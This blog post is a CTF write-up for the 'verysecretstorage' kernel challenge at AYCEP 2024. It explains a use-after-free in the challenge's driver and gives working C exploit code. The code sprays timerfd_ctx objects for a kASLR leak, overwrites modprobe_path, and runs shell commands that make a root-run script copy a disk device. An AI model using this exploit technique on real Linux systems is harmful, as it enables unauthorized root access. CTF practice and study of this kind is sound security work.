---
layout: post
title: AYCEP 2024 - verysecretstorage
date: 2024-12-19
categories: ctf
description: Writeup for verysecretstorage kernel pwn at AYCEP 2024 CTF
---
## Introduction
Recently, I participated in the AYCEP 2024 CTF, and got first place. In the CTF, there was this pretty interesting kernel pwn challenge by [Kaligula](https://kaligulaarmblessed.github.io/), verysecretstorage. This was my favourite challenge in the CTF, and also happens to be the very first kernel pwn I attempted and solved in a CTF! While the intended (and much shorter!) solution uses `subprocess_info`, which nicely fits into the kmalloc-96 cache, I did not know about it at the time of the CTF, so I used an alternative pathway with `timerfd_ctx` instead for kASLR leak.

## Analysis
Note that the below code is abridged for brevity, if you wish to view full source, can download [here](/assets/media/verysecretstorage/dist.zip).
### Data structures
#### box
```c
struct box {
    char name[0x50];
    uint64_t note_size; 
    uint64_t note_addr;
};  // 0x60 - kmalloc-96
```
### DO_CREATE
```c
case DO_CREATE: { 
    box = kmalloc(sizeof(struct box), GFP_KERNEL);
    ret = copy_from_user(buf, (void __user *) user_data.name_addr, 0x50-1);
    memcpy(&box->name, buf, 0x50-1); 
    memset(buf, 0, sizeof(buf));
    if (user_data.note_size != 0) {
        note = kmalloc(user_data.note_size, GFP_KERNEL);
        box->note_addr = (uint64_t) note; 
        box->note_size = user_data.note_size;
        
        // Copy information to the note
        ret = copy_from_user(buf, (void __user *) user_data.note_addr, box->note_size);
        memcpy((void *) note, buf, box->note_size-1);
        memset(buf, 0, sizeof(buf));
    }
    box_array[box_count] = box; 
    box_count = box_count + 1; 
    mutex_unlock(&storage_mutex); 
    return 0; 
    break;
}
```
Nothing too important here, just create a new `box` structure and allocate it in kmalloc-96.
### DO_READ
```c
case DO_READ: {
    box = box_array[user_data.idx]; 
    memcpy(buf, &box->name, 0x50-1); 
    ret = copy_to_user((void __user *)user_data.name_addr, buf, 0x50-1);
    if (box->note_addr != 0 && box->note_addr != 0x10) {
        memset(buf, 0x0, sizeof(buf)); 
        memcpy(buf, (void *)box->note_addr, box->note_size-1); 
        ret = copy_to_user((void __user *)user_data.note_addr, buf, box->note_size); 
    }
    mutex_unlock(&storage_mutex); 
    return 0; 
    break;
}
```
Just read the note and name of the box.
### DO_WRITE
```c
case DO_WRITE: {
    box = box_array[user_data.idx]; 
    ret = copy_from_user(&box->name, (void __user *) user_data.name_addr, 0x50-1);
    if (box->note_size != 0 && box->note_addr != 0 && box->note_addr != 0x10) {
        ret = copy_from_user((void *)box->note_addr, (void __user *) user_data.note_addr, box->note_size);
    }
    mutex_unlock(&storage_mutex); 
    return 0; 
    break;
}
```
Write to name and note.
### DO_RESIZE
```c
case DO_RESIZE: {
    box = box_array[user_data.idx]; 
    ret = copy_from_user(&box->name, (void __user *) user_data.name_addr, 0x50-1);
    if (user_data.note_size != 0) {
        kfree((void *)box->note_addr);
        note = kmalloc(user_data.note_size, GFP_KERNEL); 
        box->note_addr = (uint64_t)note; 
        box->note_size = user_data.note_size; 
        ret = copy_from_user(note, (void __user *) user_data.note_addr, user_data.note_size);
    }
    mutex_unlock(&storage_mutex); 
    return 0; 
    break;
}
```
Insert a note into a box, with your choice of size and data.
### DO_DELETE
```c
case DO_DELETE: {
    box = box_array[user_data.idx]; 
    if (box->note_addr != 0 && box->note_addr != 0x10) {
        kfree((void *)box->note_addr); 
        box->note_addr = 0; 
    }
    kfree(box); 
    mutex_unlock(&storage_mutex); 
    return 0; 
    break;
}
```
Finally a vulnerability! Note how the box pointer is not cleared and left dangling. This will be the basis of our exploit.

## Step 0: Setup
Before exploiting, we usually have some code to set the CPU affinity of the process - this is to ensure we stay on a single thread, and hence a single cache within the kernel, making our lives far easier.
```c
puts("Setting CPU affinity...");
cpu_set_t cpu;
CPU_ZERO(&cpu);
CPU_SET(0, &cpu);
if (sched_setaffinity(0, sizeof(cpu_set_t), &cpu)) {
    perror("sched_setaffinity");
    exit(-1);
}
```

## Step 1: UAF
First, we want to create 2 boxes, and free one of them. This leaves a freed box (we will refer to this box as box 1 from now on), aka a victim box that we can attack the structure of to gain our kASLR leak and arbitrary write later on.
```c
puts("Creating 2 boxes...");
int fd = open(DEVICE_PATH, O_WRONLY);
char name[0x1000] = {0};
unsigned long long leaks[0x600] = {0};
REQ req;
req.note_size = 0x100;
req.name_addr = name;
req.note_addr = leaks;

ioctl(fd, CREATE, &req);
ioctl(fd, CREATE, &req);

puts("Deleting box 1...");
req.idx = 1;
ioctl(fd, DELETE, &req);
```
Note that the note_addr pointer in box 1 is cleared after deleting it.

## Step 2: Heap spraying with timerfd_ctx
Now that we have the freed box, we want to repopulate the `note_addr` pointer within box 1, and have it placed right before a `timerfd_ctx` object. This is so that later on, when we change `note_size` within box 1, we can perform an out-of-bounds read into the `timerfd_ctx` object, which will give us a kASLR leak!
```c
puts("Spraying timerfd_ctx objects in kmalloc-256...");
size_t timer_fds[500];
struct itimerspec its;
for(int i=0;i<500;i++){
    if(i==250){
        puts("Inserting new note in box 1, kmalloc-256...");
        ioctl(fd, RESIZE, &req);
    }
    timer_fds[i] = timerfd_create(CLOCK_REALTIME, 0);
    its.it_value.tv_sec = 1;
    its.it_value.tv_nsec = 0;
    its.it_interval.tv_sec = 1;
    its.it_interval.tv_nsec = 0;
    timerfd_settime(timer_fds[i], 0, &its, NULL);
}
puts("Sprayed objects! Waiting for objects to populate...");
sleep(1);
```
The structure of the `timerfd_ctx` object is not too critical. Just note that it contains a pointer to the kernel, a region which is **unaffected** by FG-kASLR! As `modprobe_path`, which we will be overriding later to get flag, is also unaffected by FG-kASLR, this is perfect for us.
After the CTF, I also realized that since `CONFIG_SLAB_FREELIST_RANDOM` is not set, we do not actually need to spray the heap, instead, a single allocation of `timerfd_ctx` will be sufficient. However, there is no harm in spraying the heap, and it increases the fengshui of your exploit 😄️.

## Step 3: Modifying note_size with UAF
Now, we need to change the `note_size` of box 1. This allows us to obtain an OOB read into `timerfd_ctx`, and hence obtain heap leak.
```c
puts("Allocating note of size 0x58 in box 0 to fit in kmalloc-96...");
req.idx = 0;
req.note_size = 0x58;
unsigned long long box[12] = {0};
box[10] = 0x200;
req.note_addr = box;
ioctl(fd, RESIZE, &req);
//item0's note now has item1
puts("Box 0's note now contains pointer to box 1! Box 1 note_size faked to 0x200, ready for OOB read");
```
You may wonder why we use 0x58 instead of 0x60 for the fake box 1 object, as both sizes still go to kmalloc-96. This is so that we do not touch the `note_addr` field of box 1, which we cannot repair as we lack a heap leak. So now, the heap should look like this:
```
note_addr   note_addr + 0x100
|           |
V           V
-----------------------------
| our note  | timerfd_ctx   |
-----------------------------
```

## Step 4: Leaking modprobe_path address
As mentioned, `modprobe_path` address is unaffected by FG-kASLR (ie constant offset from kernel base, standard kASLR still applies), so is the address present in `timerfd_ctx`. Hence, the address we get from our OOB read will be at a constant offset to `modprobe_path`!
```c
puts("Leaking modprobe_path address...");
req.idx = 1;
req.note_addr = leaks;
ioctl(fd, READ, &req);
unsigned long long mpp = leaks[37] + 0x1839180;
printf("Leaked modprobe_path address: %p\n", mpp);
```
We can determine the offset of address present in `timerfd_ctx` to be 37 through printing all addresses leaked by our OOB read (too lazy to GDB it).

## Step 5: Setting note_addr to modprobe_path
Finally, we are nearing the end. We now want to set `note_addr` of box 1 to `modprobe_path`, so we can override it! What is this `modprobe_path` I keep talking about? Well, in classical ring 3 exploitation, a WWW2exec is usually accomplished by a GOT override, so in kernel, we have a `modprobe_path` override! (this is the best analogy i can come up with, for more info, see [this](https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/)) We use the RESIZE call to make the note in box 0 of size 0x60, and hence including the `note_addr` of box 1. This will still overlap box 1, as we are freeing and immediately allocating from the same kmalloc-96 cache, hence the address is constant.
```c
puts("Changing size of note in box 0 to include note_addr of box 1...");
puts("Overriding note_addr of box 1 to modprobe_path...");
req.idx = 0;
req.note_size = 0x60;
unsigned long long box2[12] = {0};
box2[10] = 0x100;
box2[11] = mpp;
req.note_addr = box2;
ioctl(fd, RESIZE, &req);
```

## Step 6: Win flag
Now all we have to do is write to `modprobe_path`, and we can get the flag!
```c
puts("Overriding modprobe_path...");
char binsh[] = "/tmp/x";
req.idx = 1;
req.note_addr = binsh;

ioctl(fd, WRITE, &req);
puts("modprobe_path overridden!");
get_flag();

void get_flag(){
    puts("Setting up for fake modprobe...");
    
    system("echo '#!/bin/sh\ncp /dev/sda /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");
    system("chmod +x /tmp/x");

    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    puts("Running unknown file...");
    system("/tmp/dummy 2>/dev/null");

    puts("Here is flag!");
    system("cat /tmp/flag");

    exit(0);
}
```
Within the kernel, when we run a file of an unknown type, this code is called:
```c
static int call_modprobe(char *module_name, int wait)
{
    ...
  	argv[0] = modprobe_path;
  	argv[1] = "-q";
  	argv[2] = "--";
  	argv[3] = module_name;
  	argv[4] = NULL;

  	info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,
					 NULL, free_modprobe_argv, NULL);
    ...
}
```
Note how we make a call to the global `modprobe_path` variable, running as root. So all we have to do is put our own script at `modprobe_path` to give us the flag!

## Step 7: Running the exploit
```
Setting CPU affinity...
Creating 2 boxes...
Deleting box 1...
Spraying timerfd_ctx objects in kmalloc-256...
Inserting new note in box 1, kmalloc-256...
Sprayed objects! Waiting for objects to populate...
Allocating note of size 0x58 in box 0 to fit in kmalloc-96...
Box 0's note now contains pointer to box 1! Box 1 note_size faked to 0x200, ready for OOB read
Leaking modprobe_path address...
Leaked modprobe_path address: 0xffffffff8c33f100
Changing size of note in box 0 to include note_addr of box 1...
Overriding note_addr of box 1 to modprobe_path...
Overriding modprobe_path...
modprobe_path overridden!
Setting up for fake modprobe...
Running unknown file...
Here is flag!
AYCEP{m0Dp70B3_P47H_t0_R0P_LLC_53C73T_sT074g3}
```

## Conclusion
Overall, I really enjoyed this challenge, special thanks once again to Kaligula for writing this! Overall was a great introduction to the kernel heap and its various objects, while not being too difficult as to be unsolvable for a first-timer.
